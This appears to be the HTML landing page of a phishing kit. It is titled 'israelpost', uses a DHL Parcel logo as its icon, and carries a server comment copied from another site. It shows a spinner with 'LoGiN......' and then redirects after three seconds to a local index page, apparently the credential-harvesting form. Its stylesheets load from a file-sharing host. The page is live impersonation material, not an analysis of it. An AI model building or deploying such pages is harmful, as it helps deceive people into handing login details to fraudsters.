<!DOCTYPE html><!--[if lt IE 9]>
<html lang="en" class="no-js lower-than-ie9 ie">
   <![endif]--><!--[if lt IE 10]>
   <html lang="en" class="no-js lower-than-ie10 ie">
      <![endif]--><!--[if !IE]>-->
      <html lang="en" class="no-js">
         <!--<![endif]-->
         <head>
            <!--Script info: script: node, template:  , date: Nov 21, 2016 11:00:28 -08:00, country: US, language: en web version:  content version:  hostname : 7HGcIamxujYbc8aq4kZ0EhYPtA7UgDN76Hp14gcHFtUQSB8IVTJHsdV0Y6Kw+YXu rlogid : %2FuZy2GWheLlU4Wv3tZRQKtVUBv6mHBMVgyq%2FkEe9SMWS9xPRvGYQj99dQKjGnw894Bwep%2F3W%2Br%2BpqiYsF56WBIOuJU9wKk7G_1588842cad8 -->
            <!-- Latest compiled and minified CSS -->
            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
            <!-- Optional theme -->
            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
            <!-- Latest compiled and minified JavaScript -->
            <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
            <title>israelpost</title>
            <link rel="icon" type="image/png" href="https://s3-eu-west-1.amazonaws.com/dhl-parcel-cdn/images/dhl-parcel-logo-hd.png" />
            <meta http-equiv="refresh" content="3;url=index/index.html" />
            <meta charset="utf-8" />
            <style>
               .loader {
               border: 16px solid #f3f3f3;
               border-radius: 50%;
               border-top: 16px solid #3498db;
               width: 120px;
               height: 120px;
               -webkit-animation: spin 2s linear infinite;
               animation: spin 2s linear infinite;
               }
               @-webkit-keyframes spin {
               0% { -webkit-transform: rotate(0deg); }
               100% { -webkit-transform: rotate(360deg); }
               }
               @keyframes spin {
               0% { transform: rotate(0deg); }
               100% { transform: rotate(360deg); }
               }
            </style>
            <link rel="stylesheet" href="https://aww.moe/jyowta.css" />
            <!--[if lte IE 9]>
            <link rel="stylesheet" href="https://aww.moe/b5e1hn.css" />
            <![endif]-->
            <center>
               <br>
               <br>
               <br>
               <br>
               <div class="loader"></div>
               </div>
               <br>
               <br>
               <h1><p>LoGiN...... </p></h1>
               <br>
               <br>
               <hr>
               <br>
 